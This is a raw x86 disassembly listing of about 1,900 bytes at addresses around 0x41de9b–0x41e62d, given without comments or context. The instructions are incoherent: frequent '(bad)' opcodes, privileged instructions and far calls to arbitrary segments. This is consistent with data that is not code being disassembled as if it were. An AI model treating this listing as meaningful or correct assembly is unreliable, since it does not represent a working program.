  41de9b:	push   ss
  41de9c:	xchg   edi,eax
  41de9d:	mov    ch,0x4a
  41de9f:	xchg   edi,eax
  41dea0:	xchg   BYTE PTR [edx+0xd7ee6ee],ch
  41dea6:	inc    esp
  41dea7:	pusha  
  41dea8:	mov    ebp,0x9130f20c
  41dead:	jbe    0x41deb9
  41deaf:	sub    esi,ecx
  41deb1:	(bad)
  41deb4:	adc    edx,DWORD PTR [esp+ebx*8-0x77]
  41deb8:	nop
  41deb9:	loope  0x41ded3
  41debb:	inc    ebp
  41debc:	push   es
  41debd:	or     BYTE PTR [ebx+0x478ab5ec],ah
  41dec3:	pushf  
  41dec4:	fmul   st,st(1)
  41dec6:	dec    ebx
  41dec7:	popf   
  41dec8:	outs   dx,DWORD PTR ds:[si]
  41deca:	cmp    DWORD PTR [eax],eax
  41decc:	cdq    
  41decd:	repnz sbb DWORD PTR ds:0xbccb548d,ecx
  41ded4:	nop
  41ded5:	dec    ecx
  41ded6:	dec    DWORD PTR [edx-0x7d358a71]
  41dedc:	pop    esi
  41dedd:	add    bh,BYTE PTR [esi-0x26]
  41dee0:	arpl   WORD PTR ds:0x58f236fe,ax
  41dee6:	ins    BYTE PTR es:[edi],dx
  41dee7:	ror    BYTE PTR [esi],1
  41dee9:	fadd   st(6),st
  41deeb:	arpl   si,bx
  41deed:	xchg   ecx,eax
  41deee:	xlat   BYTE PTR ds:[ebx]
  41deef:	pop    esp
  41def0:	push   edi
  41def1:	adc    BYTE PTR [eax+esi*8],bh
  41def4:	sbb    ecx,DWORD PTR [ebp+0x3a2a8b5c]
  41defa:	out    dx,al
  41defb:	call   0xa4fe:0x73a1146a
  41df02:	jl     0x41df2b
  41df04:	pop    esp
  41df05:	pop    ss
  41df06:	ins    DWORD PTR es:[edi],dx
  41df07:	push   eax
  41df08:	dec    esi
  41df09:	mov    eax,0xec926d85
  41df0e:	(bad)  
  41df0f:	or     eax,edx
  41df11:	xor    edi,DWORD PTR [ebp-0x3d]
  41df14:	jo     0x41df64
  41df16:	mov    eax,ds:0x56890857
  41df1b:	xor    bl,dl
  41df1d:	and    dh,BYTE PTR [edi-0x50f6026b]
  41df23:	and    eax,0x625fc487
  41df28:	mov    edi,0xa3814f40
  41df2d:	fdiv   DWORD PTR [ebp+0x7a]
  41df30:	shr    BYTE PTR [edx+0x0],1
  41df33:	adc    ecx,esi
  41df35:	push   ecx
  41df36:	mov    dl,0xb2
  41df38:	inc    ebp
  41df39:	cmc    
  41df3a:	mov    eax,ds:0x6408ee85
  41df3f:	jne    0x41df6c
  41df41:	mov    dl,0x94
  41df43:	mov    cl,0x49
  41df45:	popf   
  41df46:	ja     0x41df49
  41df48:	sbb    ebp,ebp
  41df4a:	pop    eax
  41df4b:	mov    bl,0x1d
  41df4d:	(bad)
  41df50:	pop    eax
  41df51:	add    dh,bl
  41df53:	mov    WORD PTR [esi-0x43427170],fs
  41df59:	sub    al,0x3b
  41df5b:	and    al,0x71
  41df5d:	jle    0x41df6b
  41df5f:	xor    BYTE PTR [eax+0x73],bl
  41df62:	mov    edi,0xe78e8366
  41df68:	adc    al,0x19
  41df6a:	and    BYTE PTR [ebp-0x4508afe9],ch
  41df70:	bound  esp,QWORD PTR [ecx+0x6c08e7de]
  41df76:	push   0xffffffde
  41df78:	(bad)  
  41df79:	pop    ebp
  41df7a:	(bad)  
  41df7b:	es dec eax
  41df7d:	fist   DWORD PTR [esi]
  41df7f:	mov    DWORD PTR [ecx],ebx
  41df81:	fbstp  TBYTE PTR [ebx+0x75]
  41df84:	retf   0x7673
  41df87:	xor    cl,ah
  41df89:	inc    ecx
  41df8a:	mov    bl,0x14
  41df8c:	dec    ebp
  41df8d:	icebp  
  41df8e:	in     al,0x28
  41df90:	add    ecx,DWORD PTR [edx+edi*2]
  41df93:	int    0x3b
  41df95:	repz cli 
  41df97:	int3   
  41df98:	sbb    esp,DWORD PTR [ecx]
  41df9a:	add    cl,ch
  41df9c:	lods   al,BYTE PTR ds:[esi]
  41df9d:	call   0xf5a8:0x11dcf796
  41dfa4:	push   0x3660d707
  41dfa9:	aad    0xc7
  41dfab:	test   bh,0x50
  41dfae:	in     al,0x3
  41dfb0:	in     al,0x1d
  41dfb2:	adc    ecx,eax
  41dfb4:	push   es
  41dfb5:	xor    DWORD PTR [ecx-0x55],esp
  41dfb8:	jmp    0x771:0x6f6d3195
  41dfbf:	dec    eax
  41dfc0:	adc    DWORD PTR [edi],ebp
  41dfc2:	clc    
  41dfc3:	mov    al,0x64
  41dfc5:	mov    bl,0xb1
  41dfc7:	mov    al,0xf0
  41dfc9:	enter  0x93f8,0x50
  41dfcd:	dec    ebx
  41dfce:	adc    ah,BYTE PTR [ecx]
  41dfd0:	inc    ebp
  41dfd1:	repnz sbb dl,BYTE PTR [edx+0x8bf9ba]
  41dfd8:	scas   al,BYTE PTR es:[edi]
  41dfd9:	mov    es,WORD PTR [ebx+0x4d]
  41dfdc:	wrmsr  
  41dfde:	mov    edx,0x9f54e05c
  41dfe3:	jecxz  0x41df93
  41dfe5:	mov    edx,0xedfab9eb
  41dfea:	les    ecx,FWORD PTR [ecx+0x1b]
  41dfed:	sbb    ecx,DWORD PTR [ebx+0x75eab6c]
  41dff3:	mov    DWORD PTR [edx],0xce64d7a1
  41dff9:	repnz aaa 
  41dffb:	rol    DWORD PTR [edx],cl
  41dffd:	jae    0x41dfe3
  41dfff:	add    al,0x5f
  41e001:	dec    ebp
  41e002:	and    dh,BYTE PTR [ecx-0x12225865]
  41e008:	add    ch,BYTE PTR [ebx+0x27]
  41e00b:	mov    edx,0xcc75628a
  41e010:	jb     0x41df9d
  41e012:	ins    BYTE PTR es:[edi],dx
  41e013:	icebp  
  41e014:	test   al,0x67
  41e016:	mov    cl,0xde
  41e018:	loope  0x41e063
  41e01a:	ins    BYTE PTR es:[edi],dx
  41e01b:	jmp    0x41e086
  41e01d:	mov    cl,0x1d
  41e01f:	xor    esp,edx
  41e021:	mov    ds:0x1d94b5dc,eax
  41e026:	add    ch,BYTE PTR [eax-0x2a]
  41e029:	repz (bad) 
  41e02b:	stos   DWORD PTR es:[edi],eax
  41e02c:	adc    BYTE PTR [ebp-0x54598324],dl
  41e032:	imul   ecx,edi,0xffffffe2
  41e035:	mov    ah,0x72
  41e037:	push   ecx
  41e038:	jecxz  0x41e0b7
  41e03a:	and    eax,0xb2026bf7
  41e03f:	es fmul st(0),st
  41e042:	fbld   TBYTE PTR [edi+0x5283ca2]
  41e048:	scas   eax,DWORD PTR es:[edi]
  41e049:	mov    ebx,0x2e33776d
  41e04e:	lock iret 
  41e050:	jmp    0x347b75d2
  41e055:	sub    BYTE PTR [ebp-0x2221ee5a],0x55
  41e05c:	xchg   edi,eax
  41e05d:	dec    edi
  41e05e:	addr16 retf 
  41e060:	sub    al,0xbb
  41e062:	add    eax,edx
  41e064:	es sbb eax,0x39148ba9
  41e06a:	shl    BYTE PTR [ebx+eax*4],1
  41e06d:	rol    BYTE PTR [ebx],cl
  41e06f:	and    ebp,DWORD PTR [edx-0x190c10d9]
  41e075:	pop    ss
  41e076:	cdq    
  41e077:	mov    eax,0x109d2856
  41e07c:	cmc    
  41e07d:	mov    ebx,0x81c28273
  41e082:	pop    eax
  41e083:	dec    ebx
  41e084:	mov    bl,0xe4
  41e086:	out    0x14,al
  41e088:	and    BYTE PTR [edx],dl
  41e08a:	pop    esi
  41e08b:	shl    DWORD PTR [esi+0x6754b7b4],0x77
  41e092:	in     eax,dx
  41e093:	std    
  41e094:	mov    eax,esi
  41e096:	sbb    eax,0x59ce4c02
  41e09b:	inc    edx
  41e09c:	scas   al,BYTE PTR es:[edi]
  41e09d:	adc    ah,dl
  41e09f:	push   edi
  41e0a0:	das    
  41e0a1:	rcl    edi,1
  41e0a3:	fdivr  st(5),st
  41e0a5:	pop    ebp
  41e0a6:	test   BYTE PTR [esi+0x1a],dl
  41e0a9:	(bad)  
  41e0ac:	add    eax,0x23414bd4
  41e0b1:	(bad)  
  41e0b2:	and    dh,bh
  41e0b4:	xor    al,BYTE PTR [edx-0x3a9d4df2]
  41e0ba:	dec    edx
  41e0bb:	leave  
  41e0bc:	lock add ecx,DWORD PTR [eax]
  41e0bf:	lahf   
  41e0c0:	pop    es
  41e0c1:	jmp    0x98a17447
  41e0c6:	add    bl,bh
  41e0c8:	jbe    0x41e107
  41e0ca:	xchg   ecx,eax
  41e0cb:	test   eax,0x77426d5b
  41e0d0:	sbb    eax,0x3479bde3
  41e0d5:	arpl   WORD PTR [eax-0x499e9332],di
  41e0db:	push   DWORD PTR [esi]
  41e0dd:	add    edi,eax
  41e0df:	call   0xecfe:0x750724ec
  41e0e6:	fild   DWORD PTR [edi-0x3b]
  41e0e9:	push   edi
  41e0ea:	xlat   BYTE PTR ds:[ebx]
  41e0ec:	mov    ds:0xf0dbd061,eax
  41e0f1:	dec    ebp
  41e0f2:	push   edx
  41e0f3:	aaa    
  41e0f4:	dec    ebx
  41e0f5:	inc    edx
  41e0f6:	call   0x3c:0x16dbbf02
  41e0fd:	dec    ecx
  41e0fe:	mov    bl,0x1d
  41e100:	bound  esi,QWORD PTR [edx+0x79]
  41e103:	int    0x96
  41e105:	hlt    
  41e106:	(bad)  
  41e107:	adc    al,0xf9
  41e109:	push   ds
  41e10a:	mov    esp,0x7b7bb745
  41e10f:	cs or  eax,0xd379244
  41e115:	test   DWORD PTR [eax+0x1f09bc65],esi
  41e11b:	addr16 cmp bh,ah
  41e11e:	fstp   DWORD PTR [edx]
  41e120:	cmp    edx,DWORD PTR [ebx]
  41e122:	popa   
  41e123:	jg     0x41e0e9
  41e125:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e126:	aas    
  41e127:	test   al,0x53
  41e129:	add    esp,DWORD PTR [esi]
  41e12b:	imul   DWORD PTR [ecx-0x587e8a36]
  41e131:	dec    ecx
  41e132:	dec    ebx
  41e133:	xor    eax,edx
  41e135:	sub    edx,eax
  41e137:	repz jge 0x41e16d
  41e13a:	mov    ds:0x15165753,al
  41e13f:	pop    ebp
  41e140:	outs   dx,DWORD PTR ds:[esi]
  41e141:	jmp    0x6a8a:0xede75135
  41e148:	add    al,0x2f
  41e14a:	cmp    eax,0xcd60dcc8
  41e14f:	mov    cs,WORD PTR [esi+0x560135bb]
  41e155:	push   es
  41e156:	jl     0x41e0fc
  41e158:	pop    esp
  41e159:	std    
  41e15a:	sub    al,0xae
  41e15c:	inc    eax
  41e15d:	frndint 
  41e15f:	(bad)  
  41e161:	cli    
  41e162:	fnstenv [eax+0x8]
  41e165:	ins    BYTE PTR es:[edi],dx
  41e166:	ins    BYTE PTR es:[edi],dx
  41e167:	jge    0x41e0ef
  41e169:	mov    bl,0xdc
  41e16b:	jp     0x41e142
  41e16d:	cli    
  41e16e:	scas   al,BYTE PTR es:[edi]
  41e16f:	jo     0x41e122
  41e171:	push   edi
  41e172:	pop    esp
  41e173:	jmp    0xd78b8626
  41e178:	push   ss
  41e179:	mov    edi,0xead2457d
  41e17e:	sbb    esi,DWORD PTR [ecx-0x202ad993]
  41e184:	jno    0x41e137
  41e186:	loope  0x41e158
  41e188:	mov    si,0xe255
  41e18c:	loop   0x41e204
  41e18e:	or     DWORD PTR [ecx-0x53],0xfffffff2
  41e192:	mov    ecx,0x4d407eee
  41e197:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e198:	icebp  
  41e199:	and    BYTE PTR [esi-0x7d],cl
  41e19c:	aas    
  41e19d:	sub    al,BYTE PTR [esp+edx*8-0x32932d7c]
  41e1a4:	scas   al,BYTE PTR es:[edi]
  41e1a5:	ss inc eax
  41e1a7:	retf   
  41e1a8:	jl     0x41e211
  41e1aa:	xacquire xchg BYTE PTR [eax+eiz*1],cl
  41e1ae:	gs rdtsc 
  41e1b1:	dec    ebx
  41e1b2:	add    al,BYTE PTR [esi+0x1601f791]
  41e1b8:	in     eax,dx
  41e1b9:	mov    al,0x8f
  41e1bb:	push   cs
  41e1bc:	push   esp
  41e1bd:	jno    0x41e23a
  41e1bf:	sbb    BYTE PTR [ecx],dl
  41e1c1:	aam    0x48
  41e1c3:	ror    BYTE PTR [ecx],cl
  41e1c5:	or     al,dh
  41e1c7:	in     al,0xcc
  41e1c9:	push   0x63
  41e1cb:	sar    bh,0x8e
  41e1ce:	sbb    eax,0xcf4277e4
  41e1d3:	ja     0x41e1ec
  41e1d5:	push   ebp
  41e1d6:	add    al,0xb7
  41e1d8:	ja     0x41e181
  41e1da:	xor    BYTE PTR [eax+0xe],bl
  41e1dd:	(bad)  [di]
  41e1e0:	loope  0x41e188
  41e1e2:	(bad)  
  41e1e3:	(bad)  
  41e1e4:	mov    eax,0xd2a05f3b
  41e1e9:	fnsetpm(287 only) 
  41e1eb:	cld    
  41e1ec:	imul   ebp,DWORD PTR [esi-0x32],0xc94c946d
  41e1f3:	sbb    eax,0x71f56dcf
  41e1f8:	(bad)  [ebx+0x483748f8]
  41e1fe:	adc    eax,0xe26449fe
  41e203:	and    DWORD PTR [ebx+0xf2f1b4d],ecx
  41e209:	(bad)
  41e20c:	(bad)  
  41e20d:	xor    dh,ah
  41e20f:	ja     0x41e233
  41e211:	xor    ebx,eax
  41e213:	mov    ebx,0x2915baed
  41e218:	pop    eax
  41e219:	aas    
  41e21a:	push   ebx
  41e21b:	pop    ds
  41e21c:	jb     0x41e285
  41e21e:	adc    DWORD PTR [eax+eiz*4+0x7740706c],0x28a294d4
  41e229:	jl     0x41e29b
  41e22b:	cld    
  41e22c:	adc    BYTE PTR [ecx],0x91
  41e22f:	xor    esp,DWORD PTR [esi]
  41e231:	mov    BYTE PTR [ebx+esi*2-0x6f],bh
  41e235:	pop    es
  41e236:	inc    eax
  41e237:	lea    edx,[ecx-0x2c]
  41e23a:	pop    edi
  41e23b:	imul   ebp,DWORD PTR [ebx],0x8e494481
  41e241:	stos   BYTE PTR es:[edi],al
  41e242:	fsub   DWORD PTR [esi-0x7cb2a25f]
  41e248:	push   cs
  41e249:	mov    al,0x40
  41e24b:	lahf   
  41e24c:	out    0x13,al
  41e24e:	mov    al,0xae
  41e250:	lods   al,BYTE PTR ds:[esi]
  41e251:	fwait
  41e252:	jmp    0xf648c86
  41e257:	dec    ebp
  41e258:	loopne 0x41e29b
  41e25a:	cmp    ah,BYTE PTR [ecx-0x53481b]
  41e260:	stos   BYTE PTR es:[edi],al
  41e261:	mov    al,0xf3
  41e263:	retf   0x5c14
  41e266:	mov    dh,0x21
  41e268:	call   0xaf7:0x144904f9
  41e26f:	call   0x79ab:0xb0082713
  41e276:	dec    ecx
  41e277:	lahf   
  41e278:	jae    0x41e28b
  41e27a:	push   ds
  41e27b:	jns    0x41e26a
  41e27d:	dec    esp
  41e27e:	mov    ch,BYTE PTR [edi-0xf3c39c6]
  41e284:	enter  0x5f6d,0xe5
  41e288:	lds    esi,FWORD PTR [ebp-0x7a]
  41e28b:	or     edx,DWORD PTR [ecx+0x22]
  41e28e:	leave  
  41e28f:	mov    ebx,0x12b0e4d8
  41e294:	shl    ch,cl
  41e296:	cs cmc 
  41e298:	loopne 0x41e305
  41e29a:	scas   eax,DWORD PTR es:[edi]
  41e29b:	daa    
  41e29c:	push   ebx
  41e29d:	icebp  
  41e29e:	and    ebx,DWORD PTR [esi+edx*2+0x49]
  41e2a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2a3:	dec    eax
  41e2a4:	gs push es
  41e2a6:	pop    ebp
  41e2a7:	cmp    eax,0x320e0149
  41e2ac:	push   edi
  41e2ad:	sub    bl,bh
  41e2af:	test   al,0xdf
  41e2b1:	fdivr  QWORD PTR [edi-0x2c291bb4]
  41e2b7:	and    eax,ecx
  41e2b9:	sub    eax,0xc47fad2e
  41e2be:	cli    
  41e2bf:	outs   dx,BYTE PTR ds:[esi]
  41e2c0:	outs   dx,DWORD PTR ds:[esi]
  41e2c1:	xchg   edx,eax
  41e2c2:	enter  0x853a,0xb8
  41e2c6:	dec    edx
  41e2c7:	repnz pop ebx
  41e2c9:	jecxz  0x41e2c6
  41e2cb:	push   ecx
  41e2cc:	add    eax,0x3ba2d98e
  41e2d1:	loop   0x41e254
  41e2d3:	inc    ecx
  41e2d4:	cmp    eax,0xe3a3d8f3
  41e2d9:	mov    al,al
  41e2db:	clc    
  41e2dc:	add    DWORD PTR [edx-0x73],esp
  41e2df:	xchg   DWORD PTR [ebp+0x68c42feb],esp
  41e2e5:	retf   
  41e2e6:	adc    ecx,eax
  41e2e8:	das    
  41e2e9:	retf   0x3b32
  41e2ec:	or     DWORD PTR [ebp+ecx*2-0x6a724d9c],0xffffffb4
  41e2f4:	(bad)  
  41e2f5:	call   0xf6da:0x9c822dbd
  41e2fc:	sub    eax,0x4db9b10d
  41e301:	push   ds
  41e302:	int3   
  41e303:	fistp  QWORD PTR [edx+0x1a]
  41e306:	stos   DWORD PTR es:[edi],eax
  41e307:	xchg   esp,eax
  41e308:	or     eax,0xc275d3c9
  41e30d:	pop    ecx
  41e30e:	popf   
  41e30f:	aaa    
  41e310:	adc    eax,0x13a4b89e
  41e315:	dec    ebp
  41e316:	inc    edi
  41e317:	sub    edx,DWORD PTR [edx+ebp*1]
  41e31a:	add    cl,bh
  41e31c:	into   
  41e31d:	pop    ebx
  41e31e:	jmp    0x41e34e
  41e320:	jnp    0x41e377
  41e322:	(bad)  
  41e323:	bnd jno 0x41e340
  41e326:	aad    0xc5
  41e328:	es int3 
  41e32a:	cmp    BYTE PTR [esi-0x2f59c4f8],dl
  41e330:	dec    ebp
  41e331:	retf   0xf37e
  41e334:	push   ebp
  41e335:	inc    ebx
  41e336:	sti    
  41e337:	sub    DWORD PTR [eax-0x36ebb849],edi
  41e33d:	xchg   DWORD PTR [ebp+0x6dc1e70c],esp
  41e343:	and    esp,DWORD PTR [esi+0x6ad2cdf0]
  41e349:	std    
  41e34a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e34b:	xchg   esp,eax
  41e34c:	in     eax,dx
  41e34d:	pop    esi
  41e34e:	fwait
  41e34f:	icebp  
  41e350:	pop    esp
  41e351:	adc    bh,bh
  41e353:	ins    DWORD PTR es:[edi],dx
  41e354:	fisub  DWORD PTR [edi+edi*1+0x4a]
  41e358:	jnp    0x41e32c
  41e35a:	mov    edx,DWORD PTR [esi+0x3444177d]
  41e360:	scas   al,BYTE PTR es:[edi]
  41e361:	fs sbb edx,esp
  41e364:	ja     0x41e3ba
  41e366:	pop    ds
  41e367:	in     al,dx
  41e368:	adc    eax,0xc1e8cb91
  41e36d:	sbb    BYTE PTR [edi+esi*4+0x1b],0x0
  41e372:	push   edx
  41e373:	call   0x1f90e3c1
  41e378:	mov    eax,ds:0xce13a778
  41e37d:	jmp    0xf2e9667c
  41e382:	dec    ebx
  41e383:	scas   al,BYTE PTR es:[edi]
  41e384:	mov    al,ds:0x679c14c0
  41e389:	mov    dh,0x89
  41e38b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e38c:	outs   dx,DWORD PTR ds:[esi]
  41e38d:	pop    eax
  41e38e:	jno    0x41e3ca
  41e390:	add    al,0x1e
  41e392:	out    dx,al
  41e393:	jae    0x41e38b
  41e395:	scas   al,BYTE PTR es:[edi]
  41e396:	pushf  
  41e397:	addr16 inc esp
  41e399:	add    BYTE PTR [ecx-0x65],0x53
  41e39d:	push   es
  41e39e:	fwait
  41e39f:	mov    edi,0xf243cf0d
  41e3a4:	adc    edi,DWORD PTR [ecx+eiz*2+0x38f0bd82]
  41e3ab:	inc    ebx
  41e3ac:	xor    edx,0xa1e9c9f5
  41e3b2:	cmp    DWORD PTR [eax-0x205b08d9],ecx
  41e3b8:	push   0x590c0848
  41e3bd:	mov    ecx,0x3313c030
  41e3c2:	scas   eax,DWORD PTR es:[edi]
  41e3c3:	(bad)  
  41e3c4:	push   ebp
  41e3c5:	ret    0x6cb4
  41e3c8:	jp     0x41e3cb
  41e3ca:	mov    esi,0xe4bebad4
  41e3cf:	pusha  
  41e3d0:	pop    esp
  41e3d1:	out    dx,eax
  41e3d2:	xchg   esi,eax
  41e3d3:	cld    
  41e3d4:	out    0xd9,eax
  41e3d6:	push   ds
  41e3d7:	sbb    al,BYTE PTR [edi]
  41e3d9:	in     al,0xa3
  41e3db:	jg     0x41e427
  41e3dd:	cmp    DWORD PTR ds:0x5f8e8552,0xffdc06db
  41e3e7:	mov    BYTE PTR [ebp+0x12fe3d2b],dl
  41e3ed:	lea    edx,[ecx]
  41e3ef:	adc    edx,ebp
  41e3f1:	ss xchg ecx,eax
  41e3f3:	fdivr  st,st(6)
  41e3f5:	cmp    eax,0x1504a802
  41e3fa:	push   ss
  41e3fb:	and    edx,DWORD PTR [edi]
  41e3fd:	pop    esp
  41e3fe:	loopne 0x41e38d
  41e400:	jmp    0xe64eacc3
  41e405:	dec    ecx
  41e406:	mov    cl,0xaf
  41e408:	mov    dh,0x4b
  41e40a:	ins    BYTE PTR es:[edi],dx
  41e40b:	test   ch,dh
  41e40d:	in     eax,0x40
  41e40f:	icebp  
  41e410:	mov    esp,0xbd81212a
  41e415:	pusha  
  41e416:	jbe    0x41e456
  41e418:	in     al,dx
  41e419:	test   edi,ebx
  41e41b:	cdq    
  41e41c:	pop    esi
  41e41d:	inc    ecx
  41e41e:	ficomp WORD PTR [ebx]
  41e420:	mov    ch,0x56
  41e422:	mov    es,WORD PTR [eax+0x406f1587]
  41e428:	mov    eax,0x590ac244
  41e42d:	sti    
  41e42e:	xchg   edi,eax
  41e42f:	add    al,0xc1
  41e431:	inc    ebp
  41e432:	push   ecx
  41e433:	xchg   ebx,eax
  41e434:	pop    eax
  41e435:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e436:	xchg   ecx,eax
  41e437:	cli    
  41e438:	int    0xe4
  41e43a:	mov    cl,0x24
  41e43c:	add    BYTE PTR [esi+0x6a],dh
  41e43f:	jno    0x41e462
  41e441:	xor    cl,bl
  41e443:	(bad)  
  41e444:	rcr    DWORD PTR [ebx+ebx*2+0x2b],cl
  41e448:	push   ebp
  41e449:	adc    al,0x2
  41e44b:	iret   
  41e44c:	imul   ebp,DWORD PTR [esi-0x1b],0xffffff8f
  41e450:	pop    eax
  41e451:	fsub   QWORD PTR [ecx]
  41e453:	adc    al,BYTE PTR ds:0x7f23eff1
  41e459:	jbe    0x41e43c
  41e45b:	inc    esp
  41e45c:	xor    cl,BYTE PTR [ebx-0x643afb9f]
  41e462:	es inc esp
  41e464:	or     BYTE PTR [ecx+0x4e99b2c],dl
  41e46a:	in     eax,dx
  41e46b:	data16 (bad) 
  41e46d:	xor    DWORD PTR [edx+0x28],edi
  41e470:	sbb    BYTE PTR [eax+0x45],bl
  41e473:	les    edx,FWORD PTR [ebp+0x2373d6d9]
  41e479:	shl    BYTE PTR [esi-0x318f0355],0x56
  41e480:	stc    
  41e481:	and    eax,ebx
  41e483:	mov    eax,DWORD PTR [edx]
  41e485:	ss pop ds
  41e487:	cwde   
  41e488:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e489:	hlt    
  41e48a:	loope  0x41e446
  41e48c:	jle    0x41e47d
  41e48e:	or     eax,0x17b386e1
  41e493:	sub    al,0x46
  41e495:	iret   
  41e496:	inc    eax
  41e497:	dec    BYTE PTR [edx-0x5f]
  41e49a:	add    DWORD PTR [ecx],esi
  41e49c:	sbb    al,0x6d
  41e49e:	push   edx
  41e49f:	mov    ebp,0xcfb1d8df
  41e4a4:	or     al,0xe1
  41e4a6:	dec    ebx
  41e4a7:	and    esp,ebp
  41e4a9:	push   esi
  41e4aa:	adc    al,0xf2
  41e4ac:	pop    ds
  41e4ad:	cli    
  41e4ae:	stos   DWORD PTR es:[edi],eax
  41e4af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4b0:	or     edx,DWORD PTR [esi-0x19]
  41e4b3:	mov    ds:0x44857ad5,al
  41e4b8:	inc    ebp
  41e4b9:	adc    eax,0xdc3d4160
  41e4be:	call   0x361d90e2
  41e4c3:	sbb    esp,DWORD PTR [ecx+0x3b76ca67]
  41e4c9:	sub    eax,0xc733f58e
  41e4ce:	mov    edx,0x9944b29f
  41e4d3:	cld    
  41e4d4:	mov    DWORD PTR [ecx],esp
  41e4d6:	sbb    eax,0xb3470812
  41e4db:	clc    
  41e4dc:	add    al,0xfc
  41e4de:	enter  0xa151,0x6
  41e4e2:	ret    
  41e4e3:	mov    eax,DWORD PTR [eax+0x23]
  41e4e6:	xchg   esi,eax
  41e4e7:	or     al,0x2f
  41e4e9:	xor    bh,dh
  41e4eb:	(bad)  
  41e4ec:	jmp    0x68b30462
  41e4f1:	adc    dh,BYTE PTR [edx+ebp*8-0x5e339029]
  41e4f8:	or     esi,DWORD PTR ds:0xd8c5dce2
  41e4fe:	hlt    
  41e4ff:	pop    ds
  41e500:	pop    es
  41e501:	adc    al,0x19
  41e503:	(bad)  
  41e504:	lods   al,BYTE PTR ds:[esi]
  41e505:	add    edi,0xcf613a45
  41e50b:	(bad)  
  41e50c:	pop    edi
  41e50d:	fucomi st,st(3)
  41e50f:	push   0x7
  41e511:	sahf   
  41e512:	and    edx,ebx
  41e514:	aam    0x26
  41e516:	clc    
  41e517:	leave  
  41e518:	sbb    eax,0xd71b50a0
  41e51d:	outs   dx,DWORD PTR ds:[esi]
  41e51e:	fistp  WORD PTR [edi-0x2c]
  41e521:	cli    
  41e522:	xchg   ecx,eax
  41e523:	sub    esp,ebp
  41e525:	in     eax,dx
  41e526:	imul   edx,DWORD PTR [esi+edx*8],0x40
  41e52a:	les    ebx,FWORD PTR [ebx+0x1eb38a7e]
  41e530:	jl     0x41e548
  41e532:	add    BYTE PTR [edi+edx*1],0x19
  41e536:	out    0x2a,al
  41e538:	xchg   esi,eax
  41e539:	leave  
  41e53a:	push   eax
  41e53b:	mov    BYTE PTR [eax+0x6a],cl
  41e53e:	clc    
  41e53f:	inc    ecx
  41e540:	jae    0x41e54a
  41e542:	je     0x41e555
  41e544:	mov    ebx,0xdb5516c4
  41e549:	rcl    DWORD PTR [ecx+0x65],cl
  41e54c:	add    dl,BYTE PTR [edi+0x5f229695]
  41e552:	or     eax,0x7c3272a0
  41e557:	cmp    eax,0x627e2ccd
  41e55c:	clc    
  41e55d:	repz (bad) 
  41e55f:	sub    esp,DWORD PTR [edi-0x15]
  41e562:	sub    al,0x11
  41e564:	and    edi,DWORD PTR [edi+ebx*1]
  41e567:	mov    dh,0x76
  41e569:	stos   BYTE PTR es:[edi],al
  41e56a:	push   es
  41e56b:	push   ebp
  41e56c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e56d:	fsubr  QWORD PTR [eax]
  41e56f:	jnp    0x41e5e1
  41e571:	xor    edx,eax
  41e573:	mov    ds:0xf047d37b,al
  41e578:	lea    edx,[esi]
  41e57a:	sbb    ah,BYTE PTR [edi+0x5c61e804]
  41e580:	cld    
  41e581:	sbb    DWORD PTR [edx-0x52],ecx
  41e584:	pop    edi
  41e585:	in     eax,dx
  41e586:	and    al,ah
  41e588:	or     al,0xe7
  41e58a:	cs aaa 
  41e58c:	xchg   esp,eax
  41e58d:	cmp    DWORD PTR [edi-0x4c],esi
  41e590:	(bad)  
  41e591:	sub    BYTE PTR [edx-0x24ea1164],cl
  41e597:	add    BYTE PTR [ebp-0x6e285274],bl
  41e59d:	push   edi
  41e59e:	pusha  
  41e59f:	mov    esi,0xcd542359
  41e5a4:	pop    ss
  41e5a5:	inc    edi
  41e5a6:	(bad)  [esi+0x6061d667]
  41e5ac:	ds lahf 
  41e5ae:	and    bl,BYTE PTR [ecx]
  41e5b0:	test   BYTE PTR [ebx],dl
  41e5b2:	enter  0x55c5,0xd5
  41e5b6:	ror    ebx,1
  41e5b8:	mov    ds:0xf08aba40,al
  41e5bd:	push   ecx
  41e5be:	push   ecx
  41e5bf:	mov    dl,BYTE PTR [eax+0x19]
  41e5c2:	jp     0x41e583
  41e5c4:	fisttp WORD PTR [esi]
  41e5c6:	pop    eax
  41e5c7:	sub    DWORD PTR [ecx],esp
  41e5c9:	ins    BYTE PTR es:[edi],dx
  41e5ca:	xchg   edx,eax
  41e5cb:	add    eax,0x5e6b5049
  41e5d0:	inc    ebx
  41e5d1:	hlt    
  41e5d2:	fwait
  41e5d3:	push   edi
  41e5d4:	inc    edi
  41e5d5:	sub    BYTE PTR [ecx],dh
  41e5d7:	push   esp
  41e5d8:	rol    BYTE PTR [ecx-0x28],cl
  41e5db:	and    DWORD PTR [eax],ebp
  41e5dd:	mov    DWORD PTR [esi-0x714b4c3c],ebx
  41e5e3:	(bad)  
  41e5e5:	arpl   WORD PTR [esi],ax
  41e5e7:	inc    esp
  41e5e8:	or     al,0x8a
  41e5ea:	jmp    0x41e62b
  41e5ec:	scas   eax,DWORD PTR es:[edi]
  41e5ed:	push   es
  41e5ee:	clc    
  41e5ef:	out    0x12,al
  41e5f1:	and    eax,DWORD PTR es:[edi+0x1]
  41e5f5:	in     eax,0xa1
  41e5f7:	ret    
  41e5f8:	aad    0xc7
  41e5fa:	and    ebp,DWORD PTR [edx+0x19]
  41e5fd:	mov    al,0x24
  41e5ff:	fsub   QWORD PTR [esi+0x61]
  41e602:	push   0xc2f58cc0
  41e607:	or     BYTE PTR [ebx+0xdece270],dh
  41e60d:	gs mov edi,0xdf4478ea
  41e613:	jecxz  0x41e617
  41e615:	mov    esi,0x8c1ee2bb
  41e61a:	xchg   DWORD PTR [edx+0x7bd7b9a0],ecx
  41e620:	arpl   si,si
  41e622:	iret   
  41e623:	jbe    0x41e645
  41e625:	outs   dx,BYTE PTR ds:[esi]
  41e626:	imul   esi,DWORD PTR [eax+0x6b47902],0x22
  41e62d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
